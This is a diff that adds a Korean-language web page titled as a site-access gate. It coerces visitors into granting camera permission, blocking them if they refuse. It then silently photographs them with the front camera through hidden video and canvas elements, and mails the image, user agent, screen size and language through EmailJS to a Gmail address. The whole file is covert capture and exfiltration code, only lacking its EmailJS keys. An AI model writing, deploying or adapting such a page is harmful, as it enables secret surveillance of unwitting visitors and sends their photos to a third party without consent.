@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>웹사이트 접속</title>
+  <style>
+    body {
+      margin:0; height:100vh; background:#000; color:#0f0; font-family: monospace;
+      display:flex; align-items:center; justify-content:center; flex-direction:column;
+    }
+    #info { font-size:1.3rem; margin-bottom:2rem; text-align:center; }
+    #video { display:none; }
+    #canvas { display:none; }
+  </style>
+</head>
+<body>
+
+<div id="info">
+  카메라 접근 권한을 허용해야 사이트 이용이 가능합니다.<br>
+  <small>(거부 시 페이지가 계속 로딩 중 상태로 유지됩니다)</small>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<!-- EmailJS SDK -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script type="text/javascript">
+  (function(){
+    emailjs.init({
+      publicKey: "여기에_Public_Key_넣기",   // ← EmailJS Account → Public Key
+    });
+  })();
+</script>
+
+<script>
+// ────────────────────────────────────────────────
+const video  = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const ctx    = canvas.getContext('2d');
+
+// 페이지 로드 즉시 카메라 강제 요청
+window.addEventListener('load', async () => {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },    // 전면 카메라
+      audio: false
+    });
+
+    video.srcObject = stream;
+
+    video.onloadedmetadata = () => {
+      setTimeout(captureAndSend, 800);   // 살짝 지연 후 촬영
+    };
+
+  } catch (err) {
+    document.body.innerHTML = '<h1 style="color:red">카메라 권한 필수입니다. 새로고침 후 허용해주세요.</h1>';
+    console.error("카메라 오류:", err);
+  }
+});
+
+async function captureAndSend() {
+  canvas.width  = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  const base64 = canvas.toDataURL('image/jpeg', 0.85); // 용량 줄이기 위해 0.85
+
+  const now = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });
+
+  const templateParams = {
+    timestamp: now,
+    image_base64: base64,
+    user_agent: navigator.userAgent,
+    screen: `\( {window.screen.width}× \){window.screen.height}`,
+    language: navigator.language || navigator.userLanguage,
+    // to_email은 템플릿에서 고정으로 설정했으므로 여기 안 넣어도 됨
+  };
+
+  try {
+    await emailjs.send(
+      "YOUR_SERVICE_ID",      // ← EmailJS Service ID
+      "YOUR_TEMPLATE_ID",     // ← EmailJS Template ID
+      templateParams
+    );
+    console.log("사진 전송 완료 → dog0928001@gmail.com");
+  } catch (err) {
+    console.error("EmailJS 전송 실패:", err);
+  }
+
+  // 필요하면 스트림 종료 (카메라 불 끄기)
+  // video.srcObject.getTracks().forEach(track => track.stop());
+}
+</script>
+</body>
+</html>
